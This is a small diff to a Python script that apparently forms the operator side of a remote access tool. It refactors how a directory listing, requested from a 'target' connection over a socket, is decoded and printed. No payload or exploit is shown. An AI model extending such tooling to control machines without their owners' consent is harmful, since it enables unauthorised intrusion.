@@ -30,8 +30,7 @@ def Menu(TargetConnection):
 			Directory = input("Enter remote directory: ")
 			TargetConnection.send(UserOption.encode())
 			TargetConnection.send(Directory.encode())
-			Result = TargetConnection.recv(1024)
-			Result = Result.decode('utf-8').split(",")
+			Result = decode_utf(TargetConnection.recv(1024)).split(",")
 			print("*"*40)
 			for x in Result:
 				print(x)
